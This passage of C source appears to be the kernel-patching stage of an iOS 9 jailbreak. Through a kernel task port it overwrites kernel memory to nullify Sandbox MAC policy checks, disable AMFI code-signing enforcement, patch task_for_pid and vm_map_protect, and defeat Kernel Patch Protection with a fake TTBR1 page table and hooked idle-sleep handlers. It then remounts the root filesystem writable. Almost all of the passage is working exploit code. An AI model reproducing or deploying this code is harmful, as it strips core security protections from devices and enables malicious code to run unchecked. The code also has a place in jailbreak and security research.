        uint32_t unbase_shc = last_section - region;
        uint32_t val = make_b_w(unbase_addr, unbase_shc);
        wk32(amfi_execve_ret, val); // b.w shellcode
#endif
        
        
        // Sandbox
#ifdef __LP64__
        if (kpp)
            sb_PE_i_can_has_debugger_got = fakepage_lookup(sb_PE_i_can_has_debugger_got, physp, false);
#endif
        printLog("[Sandbox] _PE_i_can_has_debugger: ret1 gadget");
        wkptr(sb_PE_i_can_has_debugger_got, ret1_gadget);
        
#ifdef __LP64__
        if (kpp)
            sb_memset_got = fakepage_lookup(sb_memset_got, physp, false);
        
        printLog("[Sandbox] _memset: shellcode");
        wkptr(sb_memset_got, sbBase);
#else
        {
            printLog("[Sandbox] MAC policies");
            // There is no KPP on these devices.
            wk32(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_fork), 0);
            wk32(sbops+offsetof(struct mac_policy_ops, mpo_iokit_check_open), 0);
            wk32(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_fsctl), 0);
            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename), 0);
            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_access), 0);
            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_chroot), 0);
            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_create), 0);
            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr), 0);
            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata), 0);
            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist), 0);
            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr), 0);
            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl), 0);
            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_link), 0);
            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr), 0);
            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_open), 0);
            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_readlink), 0);
            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_revoke), 0);
            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist), 0);
            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr), 0);
            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setflags), 0);
            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setmode), 0);
            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setowner), 0);
            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0);
            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_stat), 0);
            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_truncate), 0);
            wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_unlink), 0);
            wk32(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap), 0);
        }
#endif
    }
    printLog("[*] DONE");
    
#ifndef __LP64__
    printLog("[*] Patching kernel");
    // KPP does not exist on 32-bit devices
    {
        printLog("[*] task_for_pid(0)");
        patch_page_table(tte_virt, tte_phys, (tfp0_patch & ~0xFFF));
        wk32(tfp0_patch, 0xBF00BF00);
        usleep(10000);
        
        printLog("[*] vm_fault_enter");
        patch_page_table(tte_virt, tte_phys, (vm_fault_enter & ~0xFFF));
        wk16(vm_fault_enter, 0x2201);
        
        printLog("[*] vm_map_enter");
        patch_page_table(tte_virt, tte_phys, (vm_map_enter & ~0xFFF));
        wk32(vm_map_enter, 0xBF00BF00);
        
        printLog("[*] vm_map_protect");
        patch_page_table(tte_virt, tte_phys, (vm_map_protect & ~0xFFF));
        wk32(vm_map_protect, 0xBF00BF00);
        
        printLog("[*] csops");
        patch_page_table(tte_virt, tte_phys, (csops & ~0xFFF));
        wk32(csops, 0xBF00BF00);
        
        printLog("[AMFI] cs_enforcement_disable");
        patch_page_table(tte_virt, tte_phys, (cs_enforcement_disable & ~0xFFF));
        wk8(cs_enforcement_disable, 1);     // cs_enforcement_disable
        wk8(cs_enforcement_disable-1, 1);   // amfi_get_out_of_my_way
    }
    printLog("[*] DONE");
#endif
    
#ifdef __LP64__
    
    if (kpp) {
        sleep(1);
        
        printLog("Setting new TTBR1_EL1 ...");
        
        // set fake level1_table
        level1_table = physp - gPhysBase + gVirtBase;
        wk64(rk64(pmap_location), level1_table);
        
        // switch to fake TTBR1_EL1
        if(rk64(reg+8) == idlesleep_handler - gVirtBase + gPhysBase + 0xc){
            DEBUGLog("Found start_cpu_paddr: %llx", reg+8);
            wk64(reg+8,  physcode + 0x200); // _start_cpu_paddr
        }
        if(rk64(reg+0x18) == idlesleep_handler - gVirtBase + gPhysBase){
            DEBUGLog("Found resume_idle_cpu_paddr: %llx", reg+0x18);
            wk64(reg+0x18,  physcode + 0x100); // _resume_idle_cpu_paddr
        }
        
        /*-- hook idlesleep handler --*/
        for (int i = 0; i < z; i++) {
            DEBUGLog("Found idlesleep: %llx", plist[i]);
            wk64(plist[i], physcode + 0x100); // _resume_idle_cpu_paddr
        }
        
        printLog("[KPP] enabled patches");
        
        sleep(1);
    }
#endif
    
    sleep(1);
    
    {
        // remount (kppless...)
        vm_offset_t v_mount_off = 0;
        vm_offset_t v_flag_off = 0;
#ifdef __LP64__
        v_mount_off = 0xd8;
        v_flag_off = 0x79;
#else
        v_mount_off = 0x84;
        v_flag_off = 0x3d;
#endif
        
        kaddr_t v_mount = rkptr(rootfs_vnode + v_mount_off);
        uint32_t v_flag = rk32(v_mount + v_flag_off);
        
        wk32(v_mount + v_flag_off, v_flag & ~(1 << 6));
        
        char *nmz = strdup("/dev/disk0s1s1");
        int rv = mount("hfs", "/", MNT_UPDATE, (void *)&nmz); // remount?
        printLog("[*] rootfs remount: %d", rv);
        
        v_mount = rkptr(rootfs_vnode + v_mount_off);
        wk32(v_mount + v_flag_off, v_flag);
        
        printf("[*] remounting datafs\n");
        char* nmrd = strdup("/dev/disk0s1s2");
        int mntrd = mount("hfs", "/private/var", MNT_UPDATE|MNT_CPROTECT, &nmrd);
        printLog("[*] datafs remount: %d",mntrd);
    }
    
    printLog("[*] patched!");
    
    sleep(1);
    
    int f = open("/.cydia_no_stash", O_RDONLY);
    if (f == -1) {
        f = open("/bin/bash", O_RDONLY);
        if (f == -1) {
            f = open("/bin/launchctl", O_RDONLY);
            if (f == -1) {
                printLog("No Cydia, No package");
                return 2;
            }
        }
    }
    
    return 0;
    
fail:
    printLog("[ERROR] Failed to search koffset!");
    return -1;
}

int unjail9(mach_port_t pt, kaddr_t region, int lwvm_type, int kpp)
{
    tfp0 = pt;
    return kpatch9(region, lwvm_type, kpp);
}
